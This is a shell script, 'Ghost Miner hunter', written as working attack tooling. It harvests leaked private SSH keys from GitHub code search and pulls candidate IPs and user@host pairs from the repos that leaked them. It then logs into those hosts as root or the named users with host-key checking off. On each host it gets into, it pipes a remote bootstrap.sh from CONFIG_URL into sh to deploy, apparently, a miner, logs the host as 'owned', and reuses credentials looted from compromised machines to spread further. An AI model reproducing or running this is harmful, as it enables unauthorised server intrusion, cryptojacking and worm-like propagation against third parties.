#!/bin/sh
# ============================================================================
# Ghost Miner hunter - find (key, host) pairs on GitHub, probe them over SSH,
# and deploy with the same bootstrap. Run from your desktop or from any host:
#
#   GITHUB_TOKEN=xxx ./hunt.sh harvest    # candidates -> .hunt/targets.txt
#   ./hunt.sh probe                        # ssh-probe + deploy
#   ./hunt.sh all                          # both (default)
#
# Needs: curl, tar, ssh, awk/sed/grep/sort. No git, no jq.
# State, next to this script:  .hunt/keys/  .hunt/targets.txt  .hunt/seen.txt
# ============================================================================
set -eu

SELF_DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
WORK="${HUNT_WORK:-$SELF_DIR/.hunt}"
mkdir -p "$WORK/keys"
TARGETS="$WORK/targets.txt"
SEEN="$WORK/seen.txt"
OWNED="$WORK/owned.txt"
LOOT="$WORK/loot.txt"
touch "$TARGETS" "$SEEN" "$OWNED" "$LOOT"

# env wins over the file, so `GITHUB_TOKEN=x ./hunt.sh` still works
env_token="${GITHUB_TOKEN:-}"; env_config="${CONFIG_URL:-}"
if [ -r "$SELF_DIR/worker.env" ]; then . "$SELF_DIR/worker.env"; fi
TOKEN="${env_token:-${GITHUB_TOKEN:-}}"
CONFIG_URL="${env_config:-${CONFIG_URL:-}}"
HOSTS_PER_REPO="${HOSTS_PER_REPO:-5}"
TARGET_USERS="${TARGET_USERS:-root}"
MAX_REPOS="${HUNT_MAX_REPOS:-10}"
# A run must fit inside the unit's 30-minute TimeoutStartSec. seen.txt records
# every attempt, so hitting this cap leaves the rest queued for the next run
# instead of getting SIGTERMed halfway.
MAX_PROBE="${HUNT_MAX_PROBE:-250}"
TAB=$(printf '\t')

api() {
    if [ -n "$TOKEN" ]; then
        curl -fsSL -H "Authorization: Bearer $TOKEN" \
            -H "Accept: application/vnd.github+json" \
            -H "X-GitHub-Api-Version: 2022-11-28" "$1"
    else
        curl -fsSL -H "Accept: application/vnd.github+json" "$1"
    fi
}

# Hosts = public addresses mentioned in the repo that leaked the key. Two passes:
# config/deploy/doc files first (that is where real addresses actually live),
# then the whole tree to top up the remainder. Order = how often it shows up.
# The strict octet pattern rejects version strings such as 00.00.01.01.
IP_RE='\b(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])(\.(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])){3}\b'
# RFC1918 + CGNAT + link-local + TEST-NET + multicast/reserved + public DNS
IP_DROP='^(0\.|10\.|100\.(6[4-9]|[7-9][0-9]|1[01][0-9]|12[0-7])\.|127\.|169\.254\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.0\.2\.|192\.168\.|198\.51\.100\.|203\.0\.113\.|22[4-9]\.|2[3-5][0-9]\.)'
IP_NOISE='^(1\.0\.0\.1|1\.1\.1\.1|1\.2\.3\.4|2\.2\.2\.2|3\.3\.3\.3|4\.2\.1\.1|4\.2\.2\.[1-6]|4\.4\.4\.4|5\.6\.7\.8|8\.8\.4\.4|8\.8\.8\.8|9\.9\.9\.9|114\.114\.114\.114|123\.123\.123\.123|208\.67\.(220|222)\.22[02]|223\.5\.5\.5)$'
# A repo that literally writes "user@1.2.3.4" (deploy script, ssh config, README)
# names BOTH the host and the login. That beats guessing users against an
# arbitrary IP, so those pairs are emitted first and logged to pairs.txt.
USER_AT_RE='[A-Za-z_][A-Za-z0-9_-]*@([0-9]{1,3}\.){3}[0-9]{1,3}'
# awk sees these as ERE, where the backslashes are just noise (and warn)
IP_DROP_AWK=$(printf '%s' "$IP_DROP" | tr -d '\\')
IP_NOISE_AWK=$(printf '%s' "$IP_NOISE" | tr -d '\\')
rank_ips() {
    grep -vE "$IP_DROP" | grep -vE "$IP_NOISE" | sort | uniq -c | sort -rn | awk '{print $2}'
}

repo_hosts() {
    d="$WORK/tmp.$$"; rm -rf "$d"; mkdir -p "$d"
    if curl -fsSL "https://codeload.github.com/$1/tar.gz/HEAD" 2>/dev/null \
         | tar -xz -C "$d" 2>/dev/null; then
        grep -rshoE "$IP_RE" \
             --include='*.tf' --include='*.tfvars' --include='*.yml' --include='*.yaml' \
             --include='*.conf' --include='*.cfg' --include='*.ini' --include='*.env' \
             --include='*.properties' --include='*.sh' --include='*.md' --include='*.txt' \
             --include='hosts' --include='Dockerfile*' --include='*compose*' \
             "$d" 2>/dev/null | rank_ips > "$d/t1" || true
        grep -rshoE "$IP_RE" "$d" 2>/dev/null | rank_ips > "$d/t2" || true
        # precise pass: explicit user@host pairs, best signal in the repo
        grep -rshoE "$USER_AT_RE" "$d" 2>/dev/null | sort -u \
            | awk -F@ -v drop="$IP_DROP_AWK" -v noise="$IP_NOISE_AWK" \
                  '{ if ($NF ~ drop || $NF ~ noise) next; print }' \
            | head -n "$HOSTS_PER_REPO" > "$WORK/last.userip" || true
        cat "$d/t1"
        if [ -s "$d/t1" ]; then
            grep -vxF -f "$d/t1" "$d/t2" 2>/dev/null || true
        else
            cat "$d/t2"
        fi
    fi
    rm -rf "$d"
}

# ---------------------------------------------------------------------------
harvest() {
    if [ -z "$TOKEN" ]; then
        echo "hunt: no GITHUB_TOKEN (GitHub code search requires auth)" >&2
        return 0
    fi
    : > "$WORK/urls.txt"; : > "$WORK/repos.txt"; : > "$WORK/pairs.txt"
    # prune dead keys harvested before the -SK / unparseable filters existed
    for k in "$WORK"/keys/*; do
        [ -f "$k" ] || continue
        kinfo=$(ssh-keygen -l -f "$k" 2>/dev/null) || { rm -f "$k"; continue; }
        case "$kinfo" in *-SK*) rm -f "$k" ;; esac
    done
    # NOTE: each search result carries three html_urls - owner, repository and
    # the file itself. Only the file one contains /blob/, so keep just those,
    # otherwise an org URL can register a repo name and shadow the real key URL.
    # NOTE: per_page is what bounds the whole run - 3 queries x per_page is the
    # entire candidate pool, and only ~10% of urls are distinct repos. At
    # per_page=20 the pool is 60 urls (~6 repos) so HUNT_MAX_REPOS never even
    # binds; 100 is the API maximum and makes the pool ~300.
    # A key committed next to ansible/terraform/deploy files is far more likely
    # to be a *server* key than a random id_rsa, so bias the search that way:
    # half the queries are plain, half demand an infra marker as well.
    # filename:id_key matters because that is what THIS kit calls its own key,
    # so without it the hunter can never discover the kit's own repo.
    # Keep the count at <=10: the code_search budget is 10 requests/minute.
    for q in 'filename:id_rsa' 'filename:id_ed25519' 'filename:.pem+PRIVATE+KEY' \
             'filename:id_key' 'filename:id_rsa+ansible' 'filename:id_rsa+terraform' \
             'filename:.pem+inventory'; do
        api "https://api.github.com/search/code?q=$q&per_page=100" 2>/dev/null \
          | grep -oE '"html_url": *"[^"]+"' \
          | grep '/blob/' \
          | sed -e 's/.*"https:/https:/' -e 's/"$//' >> "$WORK/urls.txt" || true
    done
    sort -u "$WORK/urls.txt" > "$WORK/urls.uniq"
    # Shuffle so successive runs do not keep re-inspecting the same top repos,
    # then keep a bounded slice (6 urls per repo absorbs repo collisions).
    sort -R "$WORK/urls.uniq" 2>/dev/null > "$WORK/urls.sorted" || true
    [ -s "$WORK/urls.sorted" ] || cp "$WORK/urls.uniq" "$WORK/urls.sorted"
    head -n "$((MAX_REPOS * 6))" "$WORK/urls.sorted" > "$WORK/urls.head"
    mv "$WORK/urls.head" "$WORK/urls.sorted"

    while read -r url; do
        [ -n "${url:-}" ] || continue
        rest=${url#https://github.com/}
        repo=$(printf '%s' "$rest" | cut -d/ -f1,2)
        ref=$(printf '%s' "$rest" | cut -d/ -f4)
        path=$(printf '%s' "$rest" | cut -d/ -f5-)
        if [ -z "$ref" ] || [ -z "$path" ]; then continue; fi
        grep -qxF "$repo" "$WORK/repos.txt" && continue
        [ "$(tr -d ' ' < "$WORK/repos.txt" | wc -l)" -ge "$MAX_REPOS" ] && break
        printf '%s\n' "$repo" >> "$WORK/repos.txt"

        keyfile="$WORK/keys/$(printf '%s' "$repo" | tr '/' '_')"
        curl -fsSL "https://raw.githubusercontent.com/$repo/$ref/$path" \
             -o "$keyfile" 2>/dev/null || { rm -f "$keyfile"; continue; }
        grep -q 'PRIVATE KEY' "$keyfile" || { rm -f "$keyfile"; continue; }
        if grep -q 'ENCRYPTED' "$keyfile"; then rm -f "$keyfile"; continue; fi
        # A key that cannot even be parsed, or a hardware (*-SK) key whose private
        # half actually lives on a FIDO token, can never authenticate from a file.
        kinfo=$(ssh-keygen -l -f "$keyfile" 2>/dev/null) || { rm -f "$keyfile"; continue; }
        case "$kinfo" in *-SK*) rm -f "$keyfile"; continue ;; esac
        chmod 0600 "$keyfile"

        hosts=$(repo_hosts "$repo" | head -n "$HOSTS_PER_REPO")
        # precise rows first, and kept for inspection in pairs.txt
        if [ -s "$WORK/last.userip" ]; then
            while IFS=@ read -r pu ph; do
                [ -n "${ph:-}" ] || continue
                printf '%s\t%s\t%s\n' "$keyfile" "$pu" "$ph"
                printf '%s\t%s\t%s\n' "$keyfile" "$pu" "$ph" >> "$WORK/pairs.txt"
            done < "$WORK/last.userip" >> "$TARGETS"
        fi
        [ -n "$hosts" ] || continue
        printf '%s\n' "$hosts" | while read -r h; do
            for u in $TARGET_USERS; do
                printf '%s\t%s\t%s\n' "$keyfile" "$u" "$h"
            done
        done >> "$TARGETS"
    done < "$WORK/urls.sorted"

    sort -u "$TARGETS" -o "$TARGETS"
    echo "hunt: $(wc -l < "$TARGETS") candidate rows from $(wc -l < "$WORK/repos.txt") repos"
}

# ---------------------------------------------------------------------------
probe() {
    if [ ! -s "$TARGETS" ] && [ ! -s "$LOOT" ]; then
        echo "hunt: no candidates to probe"; return 0
    fi
    [ -n "$CONFIG_URL" ] || echo "hunt: CONFIG_URL unset - will test logins only" >&2
    tried=0
    # looted rows first: those triples were proven together on a live host,
    # where the GitHub ones are only correlated by repo. Precision gets budget.
    { cat "$LOOT" 2>/dev/null || :; cat "$TARGETS" 2>/dev/null || :; } \
    | while IFS="$TAB" read -r key user host; do
        [ -n "${host:-}" ] || continue
        id="$user@$host"
        # Count a row only when it is actually attempted. Counting scanned rows
        # let a run burn its entire budget skipping rows already in seen.txt.
        grep -qxF "$id" "$SEEN" 2>/dev/null && continue
        tried=$((tried + 1))
        [ "$tried" -gt "$MAX_PROBE" ] && { echo "hunt: probe cap $MAX_PROBE attempts hit, rest stays queued"; break; }
        # ConnectTimeout only bounds the TCP connect. A host that accepts the
        # socket but never sends an SSH banner can still stall the run, so wrap
        # the attempt: worst case must stay inside the unit's 30-minute timeout.
        if timeout 6 ssh -i "$key" -o IdentitiesOnly=yes -o BatchMode=yes \
               -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
               -o ConnectTimeout=3 -o ConnectionAttempts=1 "$id" true 2>/dev/null; then
            echo "hunt: login OK -> $id"
            if [ -n "$CONFIG_URL" ] && \
               timeout 180 ssh -i "$key" -o BatchMode=yes -o StrictHostKeyChecking=no \
                   -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 "$id" \
                   "curl -fsSL $CONFIG_URL/bootstrap.sh | CONFIG_URL=$CONFIG_URL sh" \
                   2>/dev/null; then
                printf '%s\n' "$id" >> "$OWNED"
                echo "hunt: DEPLOYED -> $id"
            fi
        fi
        printf '%s\n' "$id" >> "$SEEN"
    done
    sort -u "$OWNED" -o "$OWNED" 2>/dev/null || true
}

# Read this host's own trust graph before harvesting: its ssh config,
# known_hosts, own keys and history are far better edges than anything GitHub
# can correlate, and hunt.sh probes loot.txt before its own rows.
loot_now() {
    if [ -r "$SELF_DIR/loot.sh" ]; then
        HUNT_WORK="$WORK" sh "$SELF_DIR/loot.sh" || true
    fi
}

case "${1:-all}" in
    loot)    loot_now ;;
    harvest) harvest ;;
    probe)   probe ;;
    all)     loot_now; harvest; probe ;;
    *)       echo "usage: $0 [loot|harvest|probe|all]"; exit 2 ;;
esac
